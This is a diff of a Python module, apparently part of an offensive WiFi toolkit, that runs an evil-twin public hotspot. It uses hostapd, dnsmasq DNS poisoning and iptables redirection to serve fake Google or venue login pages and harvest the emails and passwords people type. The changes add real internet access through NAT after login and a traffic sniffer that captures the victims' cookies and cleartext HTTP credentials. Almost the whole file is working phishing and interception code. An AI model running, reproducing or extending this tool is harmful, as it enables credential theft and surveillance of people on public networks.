@@ -4,17 +4,23 @@ core/captive_portal.py
 Módulo de Captive Portal (Evil Twin Público)
 -------------------------------------------
 Simula una red WiFi pública de tipo "FreeMallWiFi" que al conectarse
-muestra una página de login (estilo Google, genérico o venue) para
-capturar credenciales del usuario.
+muestra una página de login (estilo Google o venue) para capturar
+credenciales del usuario.
+
+Tras el login, la víctima recibe internet real via NAT (eth0 u otra
+interfaz de salida). Simultáneamente se activa el sniffer de tráfico
+HTTP para capturar cookies y credenciales en claro mientras navegan.
 
 Stack técnico:
   - hostapd    → AP abierto (sin contraseña) con el SSID elegido
-  - dnsmasq    → DHCP  + DNS poisoning (responde 10.0.0.1 a cualquier host)
-  - iptables   → redirige TCP/80 y TCP/443 al servidor web local
-  - Flask      → sirve la página de phishing y recoge las credenciales
+  - dnsmasq    → DHCP + DNS poisoning (responde GATEWAY_IP a todo)
+  - iptables   → DNAT TCP/80+443 al portal hasta el primer login;
+                 luego NAT hacia out_interface para dar internet real
+  - Flask      → sirve la página de phishing y recoge credenciales
+  - WireTrapSniffer → captura HTTP/cookies/DNS del tráfico post-login
 
 Requisitos en Kali:
-  sudo apt install hostapd dnsmasq python3-flask
+  sudo apt install hostapd dnsmasq python3-flask python3-scapy
   (la interfaz debe estar en modo managed, NO en monitor)
 """
 
@@ -23,17 +29,11 @@ import threading
 import os
 import sys
 import time
-import signal
 import json
-import re
 from datetime import datetime
 
 WIRETRAP_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 sys.path.insert(0, WIRETRAP_DIR)
-
-# Ruta base de plantillas HTML
-TEMPLATES_DIR = os.path.join(WIRETRAP_DIR, "gui", "templates")
-
 
 # ── Configuración de red del portal ─────────────────────────────
 
@@ -44,7 +44,7 @@ SUBNET_MASK  = "255.255.255.0"
 FLASK_PORT   = 80
 
 
-# ── Plantilla HTML embebida (fallback si no existe el archivo) ───
+# ── Plantilla HTML: estilo Google ───────────────────────────────
 
 _PORTAL_HTML_GOOGLE = """<!DOCTYPE html>
 <html lang="es">
@@ -61,20 +61,18 @@ _PORTAL_HTML_GOOGLE = """<!DOCTYPE html>
     min-height: 100vh;
   }
   .card {
-    background: white;
-    border-radius: 8px;
+    background: white; border-radius: 8px;
     box-shadow: 0 2px 10px rgba(0,0,0,.15);
-    width: 360px;
-    padding: 40px 36px 36px;
-    text-align: center;
+    width: 360px; padding: 40px 36px 36px; text-align: center;
   }
-  .google-logo { font-size: 28px; color: #5f6368; font-weight: 300; letter-spacing:-1px; margin-bottom: 28px; }
-  .google-logo span.G { color:#4285F4; }
+  .google-logo { font-size: 28px; color: #5f6368; font-weight: 300;
+    letter-spacing:-1px; margin-bottom: 28px; }
+  .google-logo span.G  { color:#4285F4; }
   .google-logo span.o1 { color:#EA4335; }
   .google-logo span.o2 { color:#FBBC05; }
-  .google-logo span.g { color:#34A853; }
-  .google-logo span.l { color:#4285F4; }
-  .google-logo span.e { color:#EA4335; }
+  .google-logo span.g  { color:#34A853; }
+  .google-logo span.l  { color:#4285F4; }
+  .google-logo span.e  { color:#EA4335; }
   h2 { font-size: 24px; color: #202124; font-weight: 400; margin-bottom: 8px; }
   p.sub { color: #5f6368; font-size: 14px; margin-bottom: 28px; }
   input[type=email], input[type=password] {
@@ -87,8 +85,7 @@ _PORTAL_HTML_GOOGLE = """<!DOCTYPE html>
   .links a { color: #1a73e8; font-size: 13px; text-decoration: none; }
   .btn-next {
     background: #1a73e8; color: white; border: none; border-radius: 4px;
-    padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer;
-    float: right;
+    padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; float: right;
   }
   .btn-next:hover { background: #1765c7; }
   .btn-row { display: flex; justify-content: space-between; align-items: center; }
@@ -96,8 +93,7 @@ _PORTAL_HTML_GOOGLE = """<!DOCTYPE html>
   .footer { margin-top: 30px; font-size: 11px; color: #5f6368; }
   .info-bar {
     background: #fff3cd; border: 1px solid #ffc107; border-radius: 4px;
-    padding: 8px 12px; font-size: 12px; color: #856404; margin-bottom: 20px;
-    text-align: left;
+    padding: 8px 12px; font-size: 12px; color: #856404; margin-bottom: 20px; text-align: left;
   }
 </style>
 </head>
@@ -113,11 +109,9 @@ _PORTAL_HTML_GOOGLE = """<!DOCTYPE html>
     Se requiere autenticación para acceder a Internet.
   </div>
   <form method="POST" action="/login">
-    <input id="email" name="email" type="email"
-           placeholder="Correo electrónico o teléfono" required autofocus>
+    <input name="email" type="email" placeholder="Correo electrónico o teléfono" required autofocus>
     <div class="links"><a href="#">¿Olvidaste tu correo?</a></div>
-    <input id="password" name="password" type="password"
-           placeholder="Contraseña" required>
+    <input name="password" type="password" placeholder="Contraseña" required>
     <div class="links"><a href="#">¿Olvidaste tu contraseña?</a></div>
     <div class="btn-row">
       <div class="create-link"><a href="#">Crear cuenta</a></div>
@@ -141,26 +135,21 @@ _PORTAL_HTML_VENUE = """<!DOCTYPE html>
   body {
     font-family: 'Segoe UI', Arial, sans-serif;
     background: linear-gradient(135deg,#1a1a2e,#16213e);
-    display: flex; align-items: center; justify-content: center;
-    min-height: 100vh;
+    display: flex; align-items: center; justify-content: center; min-height: 100vh;
   }
-  .card {
-    background: white; border-radius: 12px;
-    box-shadow: 0 4px 24px rgba(0,0,0,.4);
-    width: 380px; padding: 40px;
-  }
+  .card { background: white; border-radius: 12px;
+    box-shadow: 0 4px 24px rgba(0,0,0,.4); width: 380px; padding: 40px; }
   h1 { font-size: 22px; color: #1a1a2e; text-align: center; margin-bottom: 6px; }
   p.sub { color: #666; font-size: 13px; text-align: center; margin-bottom: 28px; }
   label { font-size: 13px; color: #333; font-weight: 600; display: block; margin-bottom: 6px; }
-  input[type=email], input[type=password], input[type=text] {
+  input[type=email], input[type=password] {
     width:100%; border:1px solid #ddd; border-radius:6px;
     padding:12px 14px; font-size:14px; margin-bottom:18px;
   }
   input:focus { outline:none; border-color:#4285F4; }
   .btn-access {
     width:100%; background:#e94560; color:white; border:none;
-    border-radius:6px; padding:13px; font-size:15px; font-weight:600;
-    cursor:pointer; margin-top:4px;
+    border-radius:6px; padding:13px; font-size:15px; font-weight:600; cursor:pointer;
   }
   .btn-access:hover { background:#c73652; }
   .wifi-icon { font-size:40px; text-align:center; margin-bottom:20px; }
@@ -169,8 +158,7 @@ _PORTAL_HTML_VENUE = """<!DOCTYPE html>
   .social-btn {
     width:100%; border:1px solid #ddd; background:white;
     border-radius:6px; padding:11px; font-size:14px;
-    cursor:pointer; display:flex; align-items:center; gap:10px;
-    margin-bottom:10px;
+    cursor:pointer; display:flex; align-items:center; gap:10px; margin-bottom:10px;
   }
 </style>
 </head>
@@ -187,17 +175,12 @@ _PORTAL_HTML_VENUE = """<!DOCTYPE html>
     <button class="btn-access" type="submit">🔓 Acceder a Internet</button>
   </form>
   <hr class="divider">
-  <button class="social-btn" onclick="document.querySelector('[name=email]').form.submit()">
+  <button class="social-btn">
     <img src="https://www.google.com/favicon.ico" width="18" onerror="this.style.display='none'">
     Continuar con Google
   </button>
-  <button class="social-btn">
-    📘 Continuar con Facebook
-  </button>
-  <div class="terms">
-    Al conectarte aceptas nuestros <a href="#">Términos y Condiciones</a>
-    y la <a href="#">Política de Privacidad</a>.
-  </div>
+  <button class="social-btn">📘 Continuar con Facebook</button>
+  <div class="terms">Al conectarte aceptas nuestros <a href="#">Términos y Condiciones</a>.</div>
 </div>
 </body>
 </html>
@@ -208,7 +191,7 @@ _PORTAL_HTML_SUCCESS = """<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<meta http-equiv="refresh" content="3;url=https://www.google.com">
+<meta http-equiv="refresh" content="2;url=https://www.google.com">
 <title>Conectado</title>
 <style>
   body { font-family:Arial,sans-serif; background:#f2f2f2;
@@ -216,14 +199,14 @@ _PORTAL_HTML_SUCCESS = """<!DOCTYPE html>
   .box { background:white; border-radius:8px; padding:40px; text-align:center;
          box-shadow:0 2px 10px rgba(0,0,0,.1); }
   h2 { color:#34A853; font-size:22px; margin-bottom:10px; }
-  p { color:#5f6368; font-size:14px; }
+  p  { color:#5f6368; font-size:14px; }
 </style>
 </head>
 <body>
 <div class="box">
   <h2>✅ ¡Conectado!</h2>
   <p>Ahora tienes acceso a Internet.</p>
-  <p>Redirigiendo...</p>
+  <p>Redirigiendo a Google...</p>
 </div>
 </body>
 </html>
@@ -232,38 +215,22 @@ _PORTAL_HTML_SUCCESS = """<!DOCTYPE html>
 
 # ── Flask app ────────────────────────────────────────────────────
 
-def _build_flask_app(template_type: str, venue_name: str, creds_log: list,
-                     on_credential=None):
-    """
-    Construye y devuelve la aplicación Flask con las rutas del portal.
-    Se importa Flask aquí para no romper si no está instalado.
-    """
+def _build_flask_app(template_type, venue_name, creds_log,
+                     on_credential=None, on_client_login=None):
     try:
-        from flask import Flask, request, redirect, make_response
+        from flask import Flask, request, make_response
     except ImportError:
         return None
 
-    app = Flask(__name__, template_folder=TEMPLATES_DIR)
+    app = Flask(__name__)
     app.secret_key = os.urandom(16)
 
-    # Seleccionar plantilla
-    if template_type == "google":
-        html_template = _PORTAL_HTML_GOOGLE
-    else:
-        html_template = _PORTAL_HTML_VENUE
-
-    # Reemplazar {{ venue }} en la plantilla
-    portal_html = html_template.replace("{{ venue }}", venue_name)
+    portal_html = (_PORTAL_HTML_GOOGLE if template_type == "google"
+                   else _PORTAL_HTML_VENUE).replace("{{ venue }}", venue_name)
 
     @app.route("/", defaults={"path": ""})
     @app.route("/<path:path>")
     def catch_all(path):
-        # iOS / macOS detecta captive portal vía estos endpoints:
-        if path in ("hotspot-detect.html", "library/test/success.html",
-                    "generate_204", "connecttest.txt", "ncsi.txt",
-                    "canonical.html", "redirect"):
-            # Devolver respuesta que indica "hay portal" (no OK)
-            return make_response(portal_html, 200)
         return make_response(portal_html, 200)
 
     @app.route("/login", methods=["POST"])
@@ -272,20 +239,12 @@ def _build_flask_app(template_type: str, venue_name: str, creds_log: list,
         password = request.form.get("password", "").strip()
         ip       = request.remote_addr
         ts       = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-        entry = {
-            "timestamp": ts,
-            "ip":        ip,
-            "email":     email,
-            "password":  password,
-        }
+        entry    = {"timestamp": ts, "ip": ip, "email": email, "password": password}
         creds_log.append(entry)
-
-        # Callback a la GUI
         if on_credential:
             on_credential(entry)
-
-        # Mostrar página de éxito (no dar internet real)
+        if on_client_login:
+            on_client_login(ip)
         return make_response(_PORTAL_HTML_SUCCESS, 200)
 
     @app.route("/favicon.ico")
@@ -301,161 +260,156 @@ class CaptivePortal:
     """
     Levanta un AP abierto + DHCP + DNS poisoning + portal de phishing.
 
-    Uso típico:
-        cp = CaptivePortal("wlan0")
-        cp.on_credential = lambda e: print(e)
-        cp.start(ssid="MallWiFi", template="google", venue="Centro Comercial")
-        ...
-        cp.stop()
+    Flujo:
+      1. Víctima se conecta → portal de login (sin internet)
+      2. Víctima hace submit → credenciales capturadas
+      3. Se activa NAT para su IP → tiene internet real
+      4. WireTrapSniffer captura cookies/HTTP mientras navega
     """
 
     def __init__(self, interface: str):
-        self.interface = interface
-        self.running   = False
+        self.interface     = interface
+        self.out_interface = "eth0"
+        self.running       = False
 
-        # Configuración
         self.ssid          = "FreeWiFi"
         self.channel       = 6
         self.venue_name    = "Portal WiFi"
-        self.template_type = "google"   # "google" | "venue"
+        self.template_type = "google"
 
-        # Credenciales capturadas
-        self.captured_creds: list[dict] = []
+        self.captured_creds  = []
+        self._logged_in_ips  = set()
 
-        # Rutas de archivos temporales
-        self._hostapd_conf  = "/tmp/wt_cp_hostapd.conf"
-        self._dnsmasq_conf  = "/tmp/wt_cp_dnsmasq.conf"
-        self._dnsmasq_pid   = "/tmp/wt_cp_dnsmasq.pid"
-        self._hostapd_pid   = "/tmp/wt_cp_hostapd.pid"
+        self._hostapd_conf = "/tmp/wt_cp_hostapd.conf"
+        self._dnsmasq_conf = "/tmp/wt_cp_dnsmasq.conf"
+        self._dnsmasq_pid  = "/tmp/wt_cp_dnsmasq.pid"
 
-        # Subprocesos
-        self._hostapd_proc  = None
-        self._dnsmasq_proc  = None
-        self._flask_thread  = None
-        self._flask_server  = None
+        self._hostapd_proc = None
+        self._dnsmasq_proc = None
+        self._flask_thread = None
+        self._sniffer      = None
 
         # Callbacks GUI
-        self.on_started    = None   # fn()
-        self.on_stopped    = None   # fn()
-        self.on_error      = None   # fn(str)
-        self.on_credential = None   # fn(dict)
-        self.on_log        = None   # fn(str)
+        self.on_started    = None
+        self.on_stopped    = None
+        self.on_error      = None
+        self.on_credential = None
+        self.on_sniff_data = None
+        self.on_log        = None
 
-    # ── Utilidades internas ──────────────────────────────────────
+    # ── Utilidades ───────────────────────────────────────────────
 
-    def _log(self, msg: str):
+    def _log(self, msg):
         if self.on_log:
             self.on_log(msg)
 
-    def _err(self, msg: str):
+    def _err(self, msg):
         if self.on_error:
             self.on_error(msg)
 
     @staticmethod
-    def _hw_mode(channel: int) -> str:
+    def _hw_mode(channel):
         return "a" if channel >= 36 else "g"
+
+    # ── Configuraciones ──────────────────────────────────────────
 
     def _write_hostapd_conf(self):
         hw = self._hw_mode(self.channel)
-        conf = (
-            f"interface={self.interface}\n"
-            f"driver=nl80211\n"
-            f"ssid={self.ssid}\n"
-            f"hw_mode={hw}\n"
-            f"channel={self.channel}\n"
-            f"auth_algs=1\n"
-            f"wpa=0\n"             # ABIERTO — sin contraseña
-            f"ignore_broadcast_ssid=0\n"
-            f"ieee80211n=1\n"
-            f"wmm_enabled=1\n"
-        )
-        with open(self._hostapd_conf, "w") as f:
-            f.write(conf)
-        self._log(f"hostapd.conf escrito → {self._hostapd_conf}")
+        conf = (f"interface={self.interface}\ndriver=nl80211\nssid={self.ssid}\n"
+                f"hw_mode={hw}\nchannel={self.channel}\nauth_algs=1\nwpa=0\n"
+                f"ignore_broadcast_ssid=0\nieee80211n=1\nwmm_enabled=1\n")
+        open(self._hostapd_conf, "w").write(conf)
+        self._log(f"hostapd.conf → {self._hostapd_conf}")
 
     def _write_dnsmasq_conf(self):
-        conf = (
-            f"interface={self.interface}\n"
-            f"bind-interfaces\n"
-            f"dhcp-range={DHCP_START},{DHCP_END},{SUBNET_MASK},12h\n"
-            f"dhcp-option=3,{GATEWAY_IP}\n"   # gateway
-            f"dhcp-option=6,{GATEWAY_IP}\n"   # DNS → nosotros
-            f"address=/#/{GATEWAY_IP}\n"       # DNS poisoning total
-            f"log-dhcp\n"
-            f"no-resolv\n"
-        )
-        with open(self._dnsmasq_conf, "w") as f:
-            f.write(conf)
-        self._log(f"dnsmasq.conf escrito → {self._dnsmasq_conf}")
+        conf = (f"interface={self.interface}\nbind-interfaces\n"
+                f"dhcp-range={DHCP_START},{DHCP_END},{SUBNET_MASK},12h\n"
+                f"dhcp-option=3,{GATEWAY_IP}\ndhcp-option=6,{GATEWAY_IP}\n"
+                f"address=/#/{GATEWAY_IP}\nlog-dhcp\nno-resolv\n")
+        open(self._dnsmasq_conf, "w").write(conf)
+        self._log(f"dnsmasq.conf → {self._dnsmasq_conf}")
+
+    # ── Red ──────────────────────────────────────────────────────
 
     def _configure_interface(self):
-        """Asigna IP gateway a la interfaz y la activa."""
-        subprocess.run(["ip", "link", "set", self.interface, "up"],
+        subprocess.run(["nmcli", "dev", "set", self.interface, "managed", "no"],
                        capture_output=True)
-        # Borrar IPs previas y asignar la nuestra
-        subprocess.run(["ip", "addr", "flush", "dev", self.interface],
+        subprocess.run(["ip", "link", "set", self.interface, "up"], capture_output=True)
+        subprocess.run(["ip", "addr", "flush", "dev", self.interface], capture_output=True)
+        subprocess.run(["ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", self.interface],
                        capture_output=True)
-        subprocess.run(["ip", "addr", "add", f"{GATEWAY_IP}/24",
-                        "dev", self.interface], capture_output=True)
         self._log(f"Interfaz {self.interface} → {GATEWAY_IP}/24")
 
-    def _setup_iptables(self):
-        """Redirige todo HTTP/HTTPS al servidor Flask local."""
+    def _setup_iptables_portal(self):
+        """Todo el tráfico HTTP/HTTPS va al Flask local. Sin internet."""
         iface = self.interface
-
-        # Limpiar reglas anteriores (solo las nuestras)
+        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
         subprocess.run(["iptables", "-F"], capture_output=True)
         subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
-
-        # Permitir loopback
         subprocess.run(["iptables", "-A", "INPUT", "-i", "lo", "-j", "ACCEPT"],
                        capture_output=True)
-
-        # Permitir DHCP + DNS
         subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
-                        "-p", "udp", "--dport", "53", "-j", "ACCEPT"],
-                       capture_output=True)
+                        "-p", "udp", "--dport", "53", "-j", "ACCEPT"], capture_output=True)
         subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
-                        "-p", "udp", "--dport", "67", "-j", "ACCEPT"],
-                       capture_output=True)
-
-        # Permitir acceso al portal web (puerto 80 local)
+                        "-p", "udp", "--dport", "67", "-j", "ACCEPT"], capture_output=True)
         subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
-                        "-p", "tcp", "--dport", "80", "-j", "ACCEPT"],
-                       capture_output=True)
-
-        # Redirigir HTTP → portal local
+                        "-p", "tcp", "--dport", "80", "-j", "ACCEPT"], capture_output=True)
         subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                         "-i", iface, "-p", "tcp", "--dport", "80",
                         "-j", "DNAT", f"--to-destination={GATEWAY_IP}:{FLASK_PORT}"],
                        capture_output=True)
-
-        # Redirigir HTTPS → portal local (port 80, sin TLS — el cliente verá
-        # un error de certificado pero la mayoría de captive portals lo hace así)
         subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                         "-i", iface, "-p", "tcp", "--dport", "443",
                         "-j", "DNAT", f"--to-destination={GATEWAY_IP}:{FLASK_PORT}"],
                        capture_output=True)
-
-        # Bloquear el resto del tráfico hacia Internet (no damos acceso real)
         subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-j", "DROP"],
                        capture_output=True)
+        self._log("iptables: modo portal (sin internet)")
 
-        self._log("iptables configurado: HTTP/HTTPS → portal local")
+    def _grant_internet(self, client_ip):
+        """Abre internet real para una IP que ya pasó el portal."""
+        iface  = self.interface
+        out_if = self.out_interface
+
+        # Quitar DROP genérico de FORWARD
+        subprocess.run(["iptables", "-D", "FORWARD", "-i", iface, "-j", "DROP"],
+                       capture_output=True)
+        # Excluir esta IP del DNAT (acceso directo a internet)
+        subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
+                        "-i", iface, "-s", client_ip, "-p", "tcp", "--dport", "80",
+                        "-j", "ACCEPT"], capture_output=True)
+        subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
+                        "-i", iface, "-s", client_ip, "-p", "tcp", "--dport", "443",
+                        "-j", "ACCEPT"], capture_output=True)
+        # Permitir forward para esta IP
+        subprocess.run(["iptables", "-I", "FORWARD", "1",
+                        "-i", iface, "-s", client_ip, "-o", out_if, "-j", "ACCEPT"],
+                       capture_output=True)
+        subprocess.run(["iptables", "-I", "FORWARD", "1",
+                        "-i", out_if, "-d", client_ip, "-o", iface, "-j", "ACCEPT"],
+                       capture_output=True)
+        # Re-añadir DROP al final (nuevas víctimas siguen sin internet)
+        subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-j", "DROP"],
+                       capture_output=True)
+        # NAT saliente
+        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING",
+                        "-s", client_ip, "-o", out_if, "-j", "MASQUERADE"],
+                       capture_output=True)
+        self._log(f"[+] Internet concedido a {client_ip} via {out_if}")
 
     def _clear_iptables(self):
         subprocess.run(["iptables", "-F"], capture_output=True)
         subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
+        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
         self._log("iptables limpiado")
 
-    def _start_hostapd(self) -> bool:
+    # ── Subprocesos ──────────────────────────────────────────────
+
+    def _start_hostapd(self):
         try:
             self._hostapd_proc = subprocess.Popen(
                 ["hostapd", self._hostapd_conf],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT
-            )
-            # Esperar un momento y comprobar que sigue vivo
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
             time.sleep(2)
             if self._hostapd_proc.poll() is not None:
                 out = self._hostapd_proc.stdout.read().decode(errors="ignore")
@@ -464,24 +418,20 @@ class CaptivePortal:
             self._log(f"hostapd arrancado (PID {self._hostapd_proc.pid})")
             return True
         except FileNotFoundError:
-            self._err("hostapd no encontrado. Instálalo: sudo apt install hostapd")
+            self._err("hostapd no encontrado: sudo apt install hostapd")
             return False
         except Exception as e:
-            self._err(f"Error iniciando hostapd: {e}")
+            self._err(f"Error hostapd: {e}")
             return False
 
-    def _start_dnsmasq(self) -> bool:
+    def _start_dnsmasq(self):
         try:
-            # Matar instancias previas
             subprocess.run(["pkill", "-f", "wt_cp_dnsmasq"], capture_output=True)
             time.sleep(0.5)
-
             self._dnsmasq_proc = subprocess.Popen(
-                ["dnsmasq", "-C", self._dnsmasq_conf,
-                 "--no-daemon", "--pid-file=" + self._dnsmasq_pid],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT
-            )
+                ["dnsmasq", "-C", self._dnsmasq_conf, "--no-daemon",
+                 "--pid-file=" + self._dnsmasq_pid],
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
             time.sleep(1)
             if self._dnsmasq_proc.poll() is not None:
                 out = self._dnsmasq_proc.stdout.read().decode(errors="ignore")
@@ -490,110 +440,132 @@ class CaptivePortal:
             self._log(f"dnsmasq arrancado (PID {self._dnsmasq_proc.pid})")
             return True
         except FileNotFoundError:
-            self._err("dnsmasq no encontrado. Instálalo: sudo apt install dnsmasq")
+            self._err("dnsmasq no encontrado: sudo apt install dnsmasq")
             return False
         except Exception as e:
-            self._err(f"Error iniciando dnsmasq: {e}")
+            self._err(f"Error dnsmasq: {e}")
             return False
 
     def _start_flask(self):
-        """Arranca Flask en un thread daemon."""
         try:
-            from flask import Flask
+            from flask import Flask  # noqa
         except ImportError:
-            self._err("Flask no encontrado. Instálalo: sudo apt install python3-flask  "
-                      "o  pip3 install flask --break-system-packages")
+            self._err("Flask no encontrado: sudo apt install python3-flask")
             return False
 
         app = _build_flask_app(
             template_type=self.template_type,
             venue_name=self.venue_name,
             creds_log=self.captured_creds,
-            on_credential=self._on_new_credential
+            on_credential=self._on_new_credential,
+            on_client_login=self._on_client_login
         )
-        if app is None:
+        if not app:
             self._err("No se pudo construir la app Flask.")
             return False
 
         def run_flask():
             try:
-                import logging as _log
-                _log.getLogger("werkzeug").setLevel(_log.ERROR)
-                app.run(host=GATEWAY_IP, port=FLASK_PORT, threaded=True,
-                        use_reloader=False, debug=False)
+                import logging as _lg
+                _lg.getLogger("werkzeug").setLevel(_lg.ERROR)
+                app.run(host=GATEWAY_IP, port=FLASK_PORT,
+                        threaded=True, use_reloader=False, debug=False)
             except Exception as ex:
                 self._err(f"Flask error: {ex}")
 
         self._flask_thread = threading.Thread(target=run_flask, daemon=True)
         self._flask_thread.start()
-        self._log(f"Flask portal corriendo en http://{GATEWAY_IP}:{FLASK_PORT}")
+        self._log(f"Flask portal en http://{GATEWAY_IP}:{FLASK_PORT}")
         return True
 
-    def _on_new_credential(self, entry: dict):
-        """Llamado desde Flask cuando llega un submit."""
-        self.captured_creds.append(entry)
-        self._log(
-            f"[!] CREDENCIAL CAPTURADA  "
-            f"IP={entry['ip']}  "
-            f"email={entry['email']}  "
-            f"pass={entry['password']}"
-        )
+    def _start_sniffer(self):
+        try:
+            from post_exploitation.sniffer import WireTrapSniffer
+        except ImportError:
+            self._log("[!] Sniffer no disponible (instala python3-scapy)")
+            return
+
+        self._sniffer = WireTrapSniffer(self.interface)
+
+        def _fwd(data):
+            self._log(f"[SNIFF] {data.data_type} | {data.source_ip} | {data.value[:80]}")
+            if self.on_sniff_data:
+                self.on_sniff_data(data)
+
+        self._sniffer.on_data = _fwd
+        self._sniffer.start()
+        self._log(f"Sniffer HTTP activo en {self.interface}")
+
+    # ── Callbacks internos ───────────────────────────────────────
+
+    def _on_new_credential(self, entry):
+        self._log(f"[!!!] CREDENCIAL  IP={entry['ip']}  "
+                  f"email={entry['email']}  pass={entry['password']}")
         if self.on_credential:
             self.on_credential(entry)
 
+    def _on_client_login(self, client_ip):
+        """Llamado por Flask cuando una víctima hace submit."""
+        if client_ip in self._logged_in_ips:
+            return
+        self._logged_in_ips.add(client_ip)
+        self._log(f"[*] Login desde {client_ip} — activando internet + sniffer")
+
+        def _activate():
+            self._grant_internet(client_ip)
+            if self._sniffer is None:
+                self._start_sniffer()
+
+        threading.Thread(target=_activate, daemon=True).start()
+
     # ── API pública ──────────────────────────────────────────────
 
-    def start(self, ssid: str = "FreeWiFi", channel: int = 6,
-              template: str = "google", venue: str = "Portal WiFi"):
+    def start(self, ssid="FreeWiFi", channel=6,
+              template="google", venue="Portal WiFi",
+              out_interface="eth0"):
         """
-        Arranca el ataque.
+        Arranca el ataque completo.
 
         Args:
-            ssid:     SSID del AP falso (p.ej. "MallWiFi_FREE")
-            channel:  Canal 802.11 (1–13 para 2.4 GHz)
-            template: "google" | "venue"
-            venue:    Nombre del lugar que aparece en la página
+            ssid:          SSID del AP falso (p.ej. "MallWiFi_FREE")
+            channel:       Canal 802.11 (1-13 para 2.4 GHz)
+            template:      "google" | "venue"
+            venue:         Nombre del lugar en la página de login
+            out_interface: Interfaz con internet real (eth0, wlan1...)
         """
         if self.running:
             self._log("Ya está en ejecución.")
             return
 
         self.ssid          = ssid
-        self.channel       = max(1, min(13, channel))
+        self.channel       = max(1, min(13, int(channel)))
         self.template_type = template
         self.venue_name    = venue
+        self.out_interface = out_interface
         self.captured_creds.clear()
+        self._logged_in_ips.clear()
+        self._sniffer = None
 
         self._log("=== Iniciando Captive Portal ===")
-        self._log(f"  SSID     : {self.ssid}")
-        self._log(f"  Canal    : {self.channel}")
-        self._log(f"  Plantilla: {self.template_type}")
-        self._log(f"  Venue    : {self.venue_name}")
+        self._log(f"  SSID      : {self.ssid}")
+        self._log(f"  Canal     : {self.channel}")
+        self._log(f"  Plantilla : {self.template_type}")
+        self._log(f"  Venue     : {self.venue_name}")
+        self._log(f"  Internet  : {self.out_interface}")
 
-        # 1. Escribir configs
         self._write_hostapd_conf()
         self._write_dnsmasq_conf()
-
-        # 2. Configurar interfaz
         self._configure_interface()
 
-        # 3. Arrancar hostapd
         if not self._start_hostapd():
-            self._cleanup()
-            return
-
-        # 4. Arrancar dnsmasq
+            self._cleanup(); return
         if not self._start_dnsmasq():
-            self._cleanup()
-            return
+            self._cleanup(); return
 
-        # 5. iptables
-        self._setup_iptables()
+        self._setup_iptables_portal()
 
-        # 6. Flask
         if not self._start_flask():
-            self._cleanup()
-            return
+            self._cleanup(); return
 
         self.running = True
         self._log("=== Portal Cautivo ACTIVO — Esperando víctimas ===")
@@ -608,7 +580,11 @@ class CaptivePortal:
         self.running = False
         self._log("Deteniendo Captive Portal...")
 
-        # Matar hostapd
+        if self._sniffer:
+            try: self._sniffer.stop()
+            except Exception: pass
+            self._sniffer = None
+
         if self._hostapd_proc:
             try:
                 self._hostapd_proc.terminate()
@@ -618,7 +594,6 @@ class CaptivePortal:
                 except Exception: pass
             self._hostapd_proc = None
 
-        # Matar dnsmasq
         if self._dnsmasq_proc:
             try:
                 self._dnsmasq_proc.terminate()
@@ -628,14 +603,9 @@ class CaptivePortal:
                 except Exception: pass
             self._dnsmasq_proc = None
 
-        # Limpiar iptables
         self._clear_iptables()
+        subprocess.run(["ip", "addr", "flush", "dev", self.interface], capture_output=True)
 
-        # Bajar la interfaz (no resetear, solo quitar IP)
-        subprocess.run(["ip", "addr", "flush", "dev", self.interface],
-                       capture_output=True)
-
-        # Borrar configs temporales
         for f in [self._hostapd_conf, self._dnsmasq_conf]:
             try: os.remove(f)
             except FileNotFoundError: pass
@@ -645,21 +615,15 @@ class CaptivePortal:
             self.on_stopped()
 
     def _cleanup(self):
-        """Limpieza rápida en caso de error durante el arranque."""
         self.stop()
 
-    def export_credentials(self, path: str | None = None) -> str:
-        """
-        Exporta las credenciales capturadas a un fichero JSON.
-        Devuelve la ruta del fichero generado.
-        """
+    def export_credentials(self, path=None):
+        """Exporta las credenciales capturadas a JSON."""
         if not path:
             ts = datetime.now().strftime("%Y%m%d_%H%M%S")
             path = f"/tmp/wiretrap_creds_{ts}.json"
-
         with open(path, "w") as f:
             json.dump(self.captured_creds, f, indent=2, ensure_ascii=False)
-
         self._log(f"Credenciales exportadas → {path}")
         return path
 
@@ -667,20 +631,23 @@ class CaptivePortal:
 # ── Test de terminal ─────────────────────────────────────────────
 
 if __name__ == "__main__":
-    if len(sys.argv) < 2:
-        print("Uso: sudo python3 captive_portal.py <interfaz>")
-        print("Ejemplo: sudo python3 captive_portal.py wlan0")
+    if len(sys.argv) < 3:
+        print("Uso: sudo python3 captive_portal.py <iface_ap> <iface_internet> [ssid]")
+        print("Ejemplo: sudo python3 captive_portal.py wlan0 eth0 MallWiFi_FREE")
         sys.exit(1)
 
-    iface = sys.argv[1]
-    ssid  = sys.argv[2] if len(sys.argv) > 2 else "MallWiFi_FREE"
+    iface  = sys.argv[1]
+    out_if = sys.argv[2]
+    ssid   = sys.argv[3] if len(sys.argv) > 3 else "MallWiFi_FREE"
 
     cp = CaptivePortal(iface)
     cp.on_log        = lambda m: print(f"[LOG] {m}")
     cp.on_error      = lambda m: print(f"[ERR] {m}")
     cp.on_credential = lambda e: print(f"\n[!!!] CAPTURADO: {e}\n")
